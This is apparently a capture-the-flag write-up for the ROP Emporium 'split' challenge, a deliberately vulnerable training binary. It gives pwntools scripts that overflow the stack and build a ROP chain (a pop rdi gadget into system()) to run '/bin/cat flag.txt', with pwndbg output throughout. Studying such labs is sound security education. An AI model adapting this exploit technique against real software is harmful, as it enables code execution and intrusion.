---
title: "ROP Emporium x86-64 Challenge 2: split"
date: "2025-12-24"
description: "Writeup for the split challenge of the x86-64 ROP Emporium challenges."
---

# ROP Emporium Challenge 2: split 

#### December 24, 2025

This challenge will be our introduction to gadgets. These are very resourceful tools we can use to build **ROP chains**. Later on this writeup, we'll see what that means. For now, let's just jump right into the challenge.

```
pwndbg> info functions
...
0x0000000000400697  main
0x00000000004006e8  pwnme
0x0000000000400742  usefulFunction
...
```

It seems like for this challenge, we have a function that calls itself "useful", so let's just try to buffer overflow into it:

```
from pwn import *

OFFSET = 40
RET_INSTRUCTION_ADDRESS = 0x0040053e
EXPLOIT_FUNCTION_ADDRESS = 0x0000000000400742 # Address of usefulFunction

payload  = b"A"*OFFSET
payload += p64(RET_INSTRUCTION_ADDRESS)
payload += p64(EXPLOIT_FUNCTION_ADDRESS)
open("exploit", "bw").write(payload)
```

In order to obtain the offset I performed the same procedure I did in [the last challenge](rop-emporium-ret2win-writeup), and it turns out that every challenge in ROP Emporium has the same offset. Again, I plug in a return instruction address before the actual call to `usefulFunction` to align the stack (also explained in the last writeup), and then I call `usefulFunction` . Let's see what this does:

```
$ python3 exploit.py
$ ./split < exploit
split by ROP Emporium
x86_64

Contriving a reason to ask user for data...
> Thank you!
exploit  exploit.py  flag.txt  pat  split
```

Curious! Judging by the output, it seems like `usefulFunction` executed a `ls` command, because it printed out the files I had in the working directory. Let's verify this by disassembling `usefulFunction` in pwndbg:

```
pwndbg> disas usefulFunction
   0x0000000000400742 <+0>:	push   rbp
   0x0000000000400743 <+1>:	mov    rbp,rsp
   0x0000000000400746 <+4>:	mov    edi,0x40084a
   0x000000000040074b <+9>:	call   0x400560 <system@plt>
   0x0000000000400750 <+14>:	nop
   0x0000000000400751 <+15>:	pop    rbp
   0x0000000000400752 <+16>:	ret
```

There is a `system` function call in the function. `system` is a function that will execute the command it receives as input. The input is stored in the `edi` register, which holds a pointer to the string with the command. Let's confirm this by seeing what's stored in the pointer that is moved into `edi` right before the `system` call:

```
pwndbg> x/1s 0x40084a
0x40084a:	"/bin/ls"
```

That checks out! With the `x/1s 0x40084a` command, I print the content of 1 address in string format. This confirms that the command that is executed with `system` is `ls`.

## What we want
We have access to a `system` function. That's actually huge, because the only thing that between us and the flag is changing the argument of `system` from `/bin/ls` to `/bin/cat flag.txt`.

By reading the challenge description, we are told that somewhere in the binary we can find the `/bin/cat flag.txt` stored. In pwndbg, there's actually a command for this:

```
pwndbg> break main
pwndbg> run
pwndbg> search "/bin/cat flag.txt"
Searching for byte: b'/bin/cat flag.txt'
split           0x601060 '/bin/cat flag.txt'

```

If we run the program (and additionally add a breakpoint right in the beginning), we can search for specific strings with the `search` command. Sure enough, we find out that the string `/bin/cat flag.txt` is stored in address `0x601060`.

Now, one question remains: how do we change the argument of the `system` call? This involves a technique that we'll have to use a lot for these challenges.

```
pwndbg> disas usefulFunction
   0x0000000000400742 <+0>:	push   rbp
   0x0000000000400743 <+1>:	mov    rbp,rsp
   0x0000000000400746 <+4>:	mov    edi,0x40084a
   0x000000000040074b <+9>:	call   0x400560 <system@plt>
   0x0000000000400750 <+14>:	nop
   0x0000000000400751 <+15>:	pop    rbp
   0x0000000000400752 <+16>:	ret
```

Looking at the assembly of `usefulFunction`, we realize that the string in `0x40084a` (`/bin/ls`) is hardcoded into the `system` argument, because `system` always uses the pointer stored in `edi` to get the argument it needs to execute. Since there's a `mov`instruction, right before the call, there's little we can do.

Up until now, we've built the buffer overflow to execute `usefulFunction`. This is inconvenient because, as we've asserted, the flow of `usefulFunction` hardcodes the string in `0x40084a` into the `system` call. However, what's stopping us from executing `system` directly? That would allow us to skip the `mov`instruction. Even if doing so wouldn't be enough to get the flag, this is a more flexible approach. So instead of calling `usefulFunction`, let's call system, which as we can see is located in `0x400560`.

```
from pwn import *

OFFSET = 40
RET_INSTRUCTION_ADDRESS = 0x0040053e
EXPLOIT_FUNCTION_ADDRESS = 0x000000400560 # Address of system

payload  = b"A"*OFFSET
payload += p64(RET_INSTRUCTION_ADDRESS)
payload += p64(EXPLOIT_FUNCTION_ADDRESS)
open("exploit", "bw").write(payload)
```

## The magic of gadgets
When we perform a buffer overflow attack, our goal is to change the return address to a function we want. This function can be anything; actually, it doesn't even need to be a full function. As long as there's an address with an instruction on the return address of the stack, the binary will be able to jump into it and execute it. This is where gadgets come in handy.

A gadget is just a set of instructions, with one important distinction: these sets of instructions always end with a `ret` instruction or a jump. And why is that? Because gadgets are meant to be used to read/write into a register or a memory address and then come back to where they were called. To see it more clearly, let's give an example:

```
0x004007c2 : pop r15 ; ret
```

This is a gadget. The starting position of it is the address `0x004007c2`, in which the instruction `pop r15` is located. In the next address, there's a `ret`. Why is this useful? Because it allows us to store an arbitrary value in `r15` and then return to wherever it was as if nothing had happened.

```
0xAEAE (return address): 0x004007c2 (address to the gadget)
0xAEAF: 0xCAFE (arbitrary value)
0xAEB0: 0x000000400560 (exploit function address)
```

Let's imagine that `0xAEAE` is the return address of a stack. That means that when the function finishes its execution, it will jump to whatever code is on the address. In this case, the address points to the gadget. This will make the code jump into the `pop` instruction and it will execute it, and only then it will do the actual return.

`pop r15` is an instruction that will pop (delete) the value next to it in the stack and store it in the register `r15`. In this case, I added `0xCAFE` next to the `pop` instruction. This value will be stored in the register and then it will be deleted off the stack. What have we achieved with this? We've managed to inject an arbitrary instruction to the function!

After `0xCAFE`, there's the address of our exploit function. Since in the gadget we've selected there is a `ret` instruction, it will actually jump to the exploit function and execute it. That's why normally gadgets tend to end with a return address.

Truth be told, you can't just run whatever code you want with this. The instructions for a gadget have to exist elsewhere in the binary, you can't just plug in whatever instruction you want. What we're doing is picking specific addresses somewhere in the binary with code useful to us and executing them with a buffer overflow. Still, binaries are sizeable and they tend to have a bunch of gadgets:

```
pwndbg> rop
...
0x004007c0 : pop r14 ; pop r15 ; ret
0x004007c2 : pop r15 ; ret
0x00400694 : pop rbp ; jmp 0x400620
0x0040060b : pop rbp ; mov edi, 0x601078 ; jmp rax
0x004007bb : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x004007bf : pop rbp ; pop r14 ; pop r15 ; ret
0x00400618 : pop rbp ; ret
0x004007c3 : pop rdi ; ret
0x004007c1 : pop rsi ; pop r15 ; ret
0x004007bd : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
...
```

The `rop`command in pwndbg will find gadgets and print them out. Here are some of the gadgets it has found.

One of these gadgets is very useful for us, because it allows us to write an arbitrary value to a register we need. That's right, it's the `pop rdi` gadget! This gadget can make us write the address to the string `/bin/cat flag.txt` (which we know) to the register `rdi` (also know as `edi`).

```
from pwn import *

OFFSET = 40
RET_INSTRUCTION_ADDRESS = 0x0040053e
EXPLOIT_FUNCTION_ADDRESS = 0x000000400560 # Address of system
POP_EDI_FUNCTION_ADDRESS = 0x004007c3

payload  = b"A"*OFFSET
payload += p64(RET_INSTRUCTION_ADDRESS)
payload += p64(POP_EDI_FUNCTION_ADDRESS)
payload += p64(0x601060) # Address of the string "/bin/cat flag.txt"
payload += p64(EXPLOIT_FUNCTION_ADDRESS)
open("exploit", "bw").write(payload)
```

With this code, we can do just that. Once `pwnme` reaches the `ret` instruction,  first it will jump to the `pop rdi` gadget. it will execute the instruction, which will pop the value next to it (`0x601060`), which is the address of the string `/bin/cat flag.txt`, and it will store it in `edi`. After that, it will reach another `ret`. Since the next function in the stack is the `system` call, we will actually manage to execute `system` with the argument `/bin/cat flag.txt`, which will read us the flag. Let's see it in action:

```
$ python3 exploit.py
$ ./split < exploit
split by ROP Emporium
x86_64

Contriving a reason to ask user for data...
> Thank you!
ROPE{a_placeholder_32byte_flag!}
```

There's the flag!

